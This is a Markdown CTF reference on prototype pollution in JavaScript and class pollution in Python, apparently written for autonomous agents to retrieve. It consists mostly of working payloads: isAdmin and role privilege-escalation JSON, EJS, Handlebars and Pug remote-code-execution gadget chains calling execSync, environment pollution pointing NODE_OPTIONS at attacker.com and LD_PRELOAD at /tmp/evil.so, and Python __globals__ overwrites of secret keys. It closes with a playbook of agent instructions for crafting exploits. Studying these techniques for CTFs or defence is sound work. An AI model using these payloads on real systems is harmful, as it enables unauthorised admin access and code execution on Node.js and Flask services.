# Prototype Pollution and Class Pollution - CTF Reference

> **Document Purpose:** Actionable prototype pollution (JavaScript) and class pollution (Python) techniques for CTF challenges. Covers detection, exploitation, gadget chains, and privilege escalation for autonomous agent retrieval.

---

## 1. JavaScript Prototype Pollution Fundamentals

> **When to use this section:** You suspect a JavaScript/Node.js application is vulnerable to prototype pollution via user-controlled object merging.

**Tags:** `prototype-pollution, javascript, __proto__, constructor, fundamentals`

**Concept:** Every JavaScript object inherits from `Object.prototype`. Polluting this prototype adds properties to ALL objects in the application.

**Pollution Vectors:**
```javascript
// Via __proto__
obj.__proto__.isAdmin = true;

// Via constructor.prototype
obj.constructor.prototype.isAdmin = true;

// Via JSON input (most common in CTFs)
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

**Verification:**
```javascript
// After pollution, all new objects inherit the property
let test = {};
console.log(test.isAdmin); // true (polluted!)
```

---

## 2. Vulnerable JavaScript Functions

> **When to use this section:** Identifying which merge/assignment functions are susceptible to prototype pollution.

**Tags:** `prototype-pollution, javascript, vulnerable-functions, merge, assign`

**Vulnerable Functions:**
```javascript
// Object.assign - NOT directly vulnerable (doesn't recurse)
// But these ARE vulnerable:

// lodash.merge (< 4.17.21)
const _ = require('lodash');
_.merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));

// lodash.set / lodash.setWith
_.set({}, '__proto__.isAdmin', true);

// jQuery.extend (deep mode)
$.extend(true, {}, JSON.parse('{"__proto__": {"isAdmin": true}}'));

// deep-merge / deepmerge libraries
deepMerge(target, {"__proto__": {"isAdmin": true}});

// Custom recursive merge (extremely common in CTFs)
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);  // VULNERABLE
        } else {
            target[key] = source[key];
        }
    }
}
```

**Safe vs Unsafe Check:**
- Safe: Uses `hasOwnProperty()` check or `Object.keys()` iteration
- Safe: Blocks `__proto__`, `constructor`, `prototype` keys
- Unsafe: Iterates with `for...in` without filtering

---

## 3. JavaScript Prototype Pollution Impact

> **When to use this section:** You have confirmed prototype pollution and need to determine what to pollute.

### 3.1 Privilege Escalation

**Tags:** `prototype-pollution, privilege-escalation, isAdmin, bypass`

```json
{"__proto__": {"isAdmin": true}}
{"__proto__": {"role": "admin"}}
{"__proto__": {"authorized": true}}
{"__proto__": {"verified": true}}
{"__proto__": {"access_level": 9999}}
```

**How It Works:**
```javascript
// Application code
if (user.isAdmin) { showAdminPanel(); }
// If user object doesn't have own "isAdmin" property,
// it looks up the prototype chain and finds our polluted value
```

### 3.2 RCE via Gadget Chains

**Tags:** `prototype-pollution, rce, gadget-chain, node, command-execution`

**child_process.spawn/exec Options Pollution:**
```json
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
```

**Environment Variable Injection:**
```json
{"__proto__": {"env": {"NODE_OPTIONS": "--inspect=attacker.com:9229"}}}
{"__proto__": {"env": {"LD_PRELOAD": "/tmp/evil.so"}}}
```

---

## 4. Template Engine Gadget Chains

> **When to use this section:** Application uses a template engine and you have prototype pollution.

**Tags:** `prototype-pollution, gadget-chain, handlebars, ejs, pug, template`

**Handlebars RCE:**
```json
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": 0, "params": [{"type": "NumberLiteral", "value": "process.mainModule.require('child_process').execSync('id')"}], "loc": {"start": 0, "end": 0}}]}}
```

**Simplified Handlebars (v4.7.6 and below):**
```json
{"__proto__": {"pendingContent": "<script>alert(1)</script>"}}
```

**EJS RCE:**
```json
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}
```

**Alternative EJS Gadget:**
```json
{"__proto__": {"client": true, "escapeFunction": "1;return process.mainModule.require('child_process').execSync('id');"}}
```

**Pug RCE:**
```json
{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}
```

---

## 5. Detection and Testing

> **When to use this section:** Systematically testing for prototype pollution in a target application.

**Tags:** `prototype-pollution, detection, testing, methodology`

**Step 1: Identify Merge/Update Endpoints**
```
- Look for JSON body processing: PUT/PATCH/POST with JSON
- Profile update, settings, preferences endpoints
- Any endpoint that merges user input into objects
```

**Step 2: Inject Test Pollution**
```json
{"__proto__": {"polluted": "true"}}
```

**Step 3: Verify Pollution**
```
- Check if new API responses include "polluted": "true" in objects
- Send GET request and check if response objects have extra property
- Some CTFs provide a /debug or /status endpoint showing object state
```

**Step 4: Escalate**
```
- Try isAdmin/role pollution for privilege escalation
- If template engine is used, try RCE gadget chains
- Check for child_process usage for command injection via env pollution
```

---

## 6. Python Class Pollution

> **When to use this section:** You suspect a Python application is vulnerable to class attribute injection via recursive merge or pydash.

**Tags:** `class-pollution, python, __class__, __globals__, __init__, pydash`

**Concept:** Python's attribute resolution allows traversing `__class__`, `__init__`, `__globals__` to modify global state.

**Pollution Vectors:**
```python
# Via __class__.__init__.__globals__
{"__class__": {"__init__": {"__globals__": {"secret_key": "attacker_controlled"}}}}

# Via __class__ directly
{"__class__": {"__qualname__": "Admin"}}

# Accessing parent classes
{"__class__": {"__base__": {"__subclasses__": ...}}}
```

### 6.1 Vulnerable Python Functions

**Tags:** `class-pollution, python, pydash, recursive-merge, vulnerable`

```python
# pydash.set_ (most common)
import pydash
pydash.set_(obj, '__class__.__init__.__globals__.FLAG', 'overwritten')

# Custom recursive merge (common in CTFs)
def merge(target, source):
    for key, value in source.items():
        if hasattr(target, key) and isinstance(value, dict):
            merge(getattr(target, key), value)
        else:
            setattr(target, key, value)  # VULNERABLE

# Recursive update on __dict__
def update(obj, data):
    for k, v in data.items():
        if isinstance(v, dict) and hasattr(obj, k):
            update(getattr(obj, k), v)
        else:
            setattr(obj, k, v)
```

### 6.2 Python Class Pollution Exploitation

**Tags:** `class-pollution, python, exploitation, globals, rce`

**Overwrite Global Variables:**
```json
{"__class__": {"__init__": {"__globals__": {"admin_password": "hacked"}}}}
{"__class__": {"__init__": {"__globals__": {"SECRET_KEY": "attacker_key"}}}}
{"__class__": {"__init__": {"__globals__": {"is_admin": true}}}}
```

**Flask/Jinja2 Config Pollution:**
```json
{"__class__": {"__init__": {"__globals__": {"app": {"config": {"SECRET_KEY": "x"}}}}}}
```

**Environment Variable Override:**
```json
{"__class__": {"__init__": {"__globals__": {"os": {"environ": {"FLAG": "leaked"}}}}}
```

---

## 7. Common CTF Patterns

> **When to use this section:** Solving prototype/class pollution challenges in CTF competitions.

**Tags:** `prototype-pollution, class-pollution, ctf, patterns, login-bypass`

**Pattern 1: Login Bypass via isAdmin**
```
Challenge: "Access the admin panel"
Endpoint: POST /api/profile with JSON body
Payload: {"name": "user", "__proto__": {"isAdmin": true}}
Result: All objects now have isAdmin=true, admin access granted
```

**Pattern 2: Template Engine RCE**
```
Challenge: Node.js app with EJS templates
Step 1: Pollute via merge endpoint
Payload: {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('cat /flag.txt');s"}}
Step 2: Trigger template render (visit any page)
Result: Command executes, flag in response
```

**Pattern 3: Python Global Override**
```
Challenge: Flask app with profile update
Endpoint: POST /api/settings
Payload: {"__class__": {"__init__": {"__globals__": {"FLAG": "give_me_flag"}}}}
Result: Global FLAG variable overwritten or leaked
```

**Pattern 4: Environment Variable Manipulation**
```
Challenge: App reads flag from environment
Payload (JS): {"__proto__": {"env": {"FLAG": ""}}}
Payload (Py): {"__class__": {"__init__": {"__globals__": {"os": {"environ": {...}}}}}}
```

**CTF Playbook:**
1. Identify JSON merge/update endpoints
2. Test with `{"__proto__": {"polluted": "true"}}` (JS) or `{"__class__": {"__init__": {"__globals__": {"polluted": "true"}}}}` (Python)
3. Verify pollution via API responses or behavior changes
4. For privilege escalation: pollute `isAdmin`, `role`, `authorized`
5. For RCE: identify template engine and use corresponding gadget chain
6. For Python: traverse `__class__.__init__.__globals__` to overwrite critical variables

---

## 8. Agent Takeaway

> - Use `prototype_pollution_probe` tool to detect pollution vectors automatically
> - After detection, manually craft exploitation payloads based on the application's technology stack
> - For JavaScript: EJS gadget (`outputFunctionName`) is the most reliable RCE path in Node.js CTFs
> - For Python: `pydash.set_` and custom recursive merge are the primary vulnerability sources
> - Always test with a benign property first (`{"__proto__": {"polluted": true}}`) before attempting RCE
> - Privilege escalation via `isAdmin`/`role` pollution is the most common CTF pattern
> - Template engine gadget chains are version-specific; check the library version if possible
> - Python class pollution chains can reach any global variable via `__class__.__init__.__globals__`
